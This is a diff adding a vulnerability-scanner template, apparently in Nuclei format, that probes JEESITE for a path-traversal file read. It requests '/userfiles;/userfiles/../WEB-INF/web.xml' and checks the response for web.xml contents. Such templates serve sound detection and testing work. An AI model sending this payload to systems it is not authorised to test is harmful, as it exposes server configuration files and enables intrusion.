@@ -1,0 +1,27 @@
+id: poc-yaml-jeesite-userfiles-path-traversal
+
+info:
+  name: poc-yaml-jeesite-userfiles-path-traversal
+  author: socat
+  severity: high
+  tags: xray-converted,rfi,traversal,ct-515866
+  reference:
+    - http://www.yulegeyu.com/2021/06/19/JEESITE-V1-2-7-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/
+
+http:
+  - raw:
+      - |
+        GET /userfiles;/userfiles/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+          - "thinkgem.jeesite"
+          - "<listener-class>"
